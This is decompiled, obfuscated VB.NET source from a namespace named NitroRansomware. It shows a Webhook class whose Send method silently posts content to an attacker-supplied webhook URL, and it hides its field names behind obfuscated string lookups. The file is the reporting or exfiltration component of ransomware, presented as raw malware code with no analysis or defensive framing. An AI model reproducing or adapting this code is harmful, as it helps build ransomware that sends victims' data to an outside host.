Imports System
Imports System.Collections.Generic
Imports System.Net.Http
Imports dg3ypDAonQcOidMs0w
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x0200000C RID: 12
	Friend Class Webhook
		' Token: 0x06000044 RID: 68 RVA: 0x00002405 File Offset: 0x00000605
		Public Sub New(userWebhook As String)
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
			Me.webhook = userWebhook
		End Sub

		' Token: 0x06000045 RID: 69 RVA: 0x00005050 File Offset: 0x00003250
		Public Sub Send(content As String)
			Dim dictionary As Dictionary(Of String, String) = New Dictionary(Of String, String)() From { { WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5440), content }, { WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5458), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996) }, { WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5478), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5502) } }
			Try
				Using httpClient As HttpClient = New HttpClient()
					httpClient.PostAsync(Me.webhook, New FormUrlEncodedContent(dictionary)).GetAwaiter().GetResult()
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x06000046 RID: 70 RVA: 0x0000223C File Offset: 0x0000043C
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
		End Sub

		' Token: 0x0400003E RID: 62
		Private webhook As String
	End Class
End Namespace
